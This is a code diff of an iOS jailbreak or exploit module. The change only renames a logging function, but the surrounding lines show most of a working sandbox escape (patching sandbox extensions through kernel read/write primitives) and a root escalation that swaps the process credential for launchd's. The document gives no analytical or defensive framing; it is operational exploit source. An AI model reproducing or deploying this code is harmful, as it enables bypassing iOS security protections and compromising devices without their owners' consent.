@@ -16,7 +16,7 @@
 
 // === 本地日志系统 ===
 static FILE *g_logFile = NULL;
-static void SBX_LOG(NSString *fmt, ...) {
+static void DSLOG(NSString *fmt, ...) {
     va_list args;
     va_start(args, fmt);
     NSString *msg = [[NSString alloc] initWithFormat:fmt arguments:args];
@@ -138,22 +138,22 @@ static void set_rw_class(uint64_t hdr) {
 #pragma mark - Main entry
 
 int sandbox_escape(uint64_t self_proc) {
-    if (!self_proc) { SBX_LOG(@"[SBX] self_proc is NULL"); return -1; }
+    if (!self_proc) { DSLOG(@"[SBX] self_proc is NULL"); return -1; }
 
     uint64_t proc_ro_raw = early_kread64(self_proc + OFF_PROC_PROC_RO);
     uint64_t proc_ro = S(proc_ro_raw);
-    SBX_LOG(@"[SBX] self_proc=0x%llx proc_ro_raw=0x%llx proc_ro=0x%llx", self_proc, proc_ro_raw, proc_ro);
-    if (!K(proc_ro)) { SBX_LOG(@"[SBX] proc_ro invalid"); return -1; }
+    DSLOG(@"[SBX] self_proc=0x%llx proc_ro_raw=0x%llx proc_ro=0x%llx", self_proc, proc_ro_raw, proc_ro);
+    if (!K(proc_ro)) { DSLOG(@"[SBX] proc_ro invalid"); return -1; }
 
     // Scan proc_ro for ucred — offset varies by iOS build.
     // p_ucred is an SMR pointer. Dump offsets 0x10-0x40 to find it.
-    SBX_LOG(@"[SBX] Scanning proc_ro for ucred...");
+    DSLOG(@"[SBX] Scanning proc_ro for ucred...");
     uint64_t ucred = 0;
     for (uint32_t off = 0x10; off <= 0x60; off += 0x8) {
         uint64_t raw = early_kread64(proc_ro + off);
         uint64_t smr = kread_smrptr(proc_ro + off);
         uint64_t pac = S(raw);
-        SBX_LOG(@"[SBX]   proc_ro+0x%x: raw=0x%llx smr=0x%llx pac=0x%llx", off, raw, smr, pac);
+        DSLOG(@"[SBX]   proc_ro+0x%x: raw=0x%llx smr=0x%llx pac=0x%llx", off, raw, smr, pac);
 
         // Check if smr-decoded value looks like ucred (cr_label at +0x78 is a kernel ptr)
         if (K(smr)) {
@@ -161,7 +161,7 @@ int sandbox_escape(uint64_t self_proc) {
             if (K(maybe_label)) {
                 uint64_t maybe_sandbox = S(early_kread64(maybe_label + 0x10));
                 if (K(maybe_sandbox)) {
-                    SBX_LOG(@"[SBX] Found ucred at proc_ro+0x%x (SMR) = 0x%llx", off, smr);
+                    DSLOG(@"[SBX] Found ucred at proc_ro+0x%x (SMR) = 0x%llx", off, smr);
                     ucred = smr;
                     break;
                 }
@@ -173,25 +173,25 @@ int sandbox_escape(uint64_t self_proc) {
             if (K(maybe_label)) {
                 uint64_t maybe_sandbox = S(early_kread64(maybe_label + 0x10));
                 if (K(maybe_sandbox)) {
-                    SBX_LOG(@"[SBX] Found ucred at proc_ro+0x%x (PAC) = 0x%llx", off, pac);
+                    DSLOG(@"[SBX] Found ucred at proc_ro+0x%x (PAC) = 0x%llx", off, pac);
                     ucred = pac;
                     break;
                 }
             }
         }
     }
-    if (!K(ucred)) { SBX_LOG(@"[SBX] ucred not found in proc_ro"); return -1; }
+    if (!K(ucred)) { DSLOG(@"[SBX] ucred not found in proc_ro"); return -1; }
 
     uint64_t label = S(early_kread64(ucred + OFF_UCRED_CR_LABEL));
-    if (!K(label)) { SBX_LOG(@"[SBX] cr_label invalid"); return -1; }
+    if (!K(label)) { DSLOG(@"[SBX] cr_label invalid"); return -1; }
 
     uint64_t sandbox = S(early_kread64(label + OFF_LABEL_SANDBOX));
-    if (!K(sandbox)) { SBX_LOG(@"[SBX] sandbox invalid"); return -1; }
+    if (!K(sandbox)) { DSLOG(@"[SBX] sandbox invalid"); return -1; }
 
     uint64_t ext_set = S(early_kread64(sandbox + OFF_SANDBOX_EXT_SET));
-    if (!K(ext_set)) { SBX_LOG(@"[SBX] ext_set invalid"); return -1; }
+    if (!K(ext_set)) { DSLOG(@"[SBX] ext_set invalid"); return -1; }
 
-    SBX_LOG(@"[SBX] proc_ro=0x%llx ucred=0x%llx label=0x%llx sandbox=0x%llx ext_set=0x%llx",
+    DSLOG(@"[SBX] proc_ro=0x%llx ucred=0x%llx label=0x%llx sandbox=0x%llx ext_set=0x%llx",
           proc_ro, ucred, label, sandbox, ext_set);
 
     int patched = 0;
@@ -199,14 +199,14 @@ int sandbox_escape(uint64_t self_proc) {
         uint64_t hdr = S(early_kread64(ext_set + s * 8));
         if (K(hdr)) patched += patch_chain(hdr);
     }
-    SBX_LOG(@"[SBX] Patched %d extensions", patched);
+    DSLOG(@"[SBX] Patched %d extensions", patched);
 
     int classed = 0;
     for (int s = 0; s < 16; s++) {
         uint64_t hdr = S(early_kread64(ext_set + s * 8));
         if (K(hdr) && K(early_kread64(hdr + 0x10))) { set_rw_class(hdr); classed++; }
     }
-    SBX_LOG(@"[SBX] Changed %d extension classes", classed);
+    DSLOG(@"[SBX] Changed %d extension classes", classed);
 
     uint64_t src = 0;
     for (int s = 0; s < 16 && !src; s++) {
@@ -219,18 +219,18 @@ int sandbox_escape(uint64_t self_proc) {
             uint64_t h = early_kread64(ext_set + s * 8);
             if (!h || !K(h)) { early_kwrite64(ext_set + s * 8, src); filled++; }
         }
-        SBX_LOG(@"[SBX] Filled %d empty hash slots", filled);
+        DSLOG(@"[SBX] Filled %d empty hash slots", filled);
     }
 
     int fd_w = open("/var/mobile/.sbx_test", O_WRONLY | O_CREAT | O_TRUNC, 0644);
     if (fd_w >= 0) { close(fd_w); unlink("/var/mobile/.sbx_test"); }
 
     if (fd_w >= 0) {
-        SBX_LOG(@"[SBX] *** SANDBOX ESCAPED (R+W) ***");
+        DSLOG(@"[SBX] *** SANDBOX ESCAPED (R+W) ***");
         return 0;
     }
 
-    SBX_LOG(@"[SBX] Sandbox escape verification failed (errno=%d: %s)", errno, strerror(errno));
+    DSLOG(@"[SBX] Sandbox escape verification failed (errno=%d: %s)", errno, strerror(errno));
     return -1;
 }
 
@@ -274,41 +274,41 @@ static uint64_t sbx_ucredbyproc(uint64_t proc) {
 int sandbox_elevate_to_root(uint64_t self_proc) {
     uint64_t launchd = proc_find_by_name("launchd");
     if (!launchd || launchd == (uint64_t)-1) {
-        SBX_LOG(@"[SBX] elevate: procbyname(\"launchd\") failed; trying pid 1 fallback");
+        DSLOG(@"[SBX] elevate: procbyname(\"launchd\") failed; trying pid 1 fallback");
         launchd = proc_find(1);
         if (launchd && launchd != (uint64_t)-1) {
-            SBX_LOG(@"[SBX] elevate: resolved launchd via pid 1 fallback: 0x%llx", launchd);
+            DSLOG(@"[SBX] elevate: resolved launchd via pid 1 fallback: 0x%llx", launchd);
         }
     }
     if (!launchd || launchd == (uint64_t)-1) {
-        SBX_LOG(@"[SBX] elevate: could not find launchd");
+        DSLOG(@"[SBX] elevate: could not find launchd");
         return -1;
     }
 
     uint64_t launchducred = sbx_ucredbyproc(launchd);
     if (!launchducred) {
-        SBX_LOG(@"[SBX] elevate: failed to get valid ucred from launchd");
+        DSLOG(@"[SBX] elevate: failed to get valid ucred from launchd");
         return -1;
     }
-    SBX_LOG(@"[SBX] elevate: launchd ucred: 0x%llx", launchducred);
+    DSLOG(@"[SBX] elevate: launchd ucred: 0x%llx", launchducred);
 
     if (!self_proc) {
-        SBX_LOG(@"[SBX] elevate: failed to get our proc");
+        DSLOG(@"[SBX] elevate: failed to get our proc");
         return -1;
     }
-    SBX_LOG(@"[SBX] elevate: ourproc: 0x%llx", self_proc);
+    DSLOG(@"[SBX] elevate: ourproc: 0x%llx", self_proc);
 
     uint64_t ourucredraw = early_kread64(self_proc + 0x10);
     uint64_t ourucred = S(ourucredraw);
-    SBX_LOG(@"[SBX] elevate: ourucred: 0x%llx", ourucred);
+    DSLOG(@"[SBX] elevate: ourucred: 0x%llx", ourucred);
 
     early_kwrite64(self_proc + 0x10, launchducred);
 
     if (getuid() == 0) {
-        SBX_LOG(@"[SBX] elevate success!");
+        DSLOG(@"[SBX] elevate success!");
         return 0;
     }
 
-    SBX_LOG(@"[SBX] elevate failed, uid: %d", getuid());
+    DSLOG(@"[SBX] elevate failed, uid: %d", getuid());
     return -1;
 }
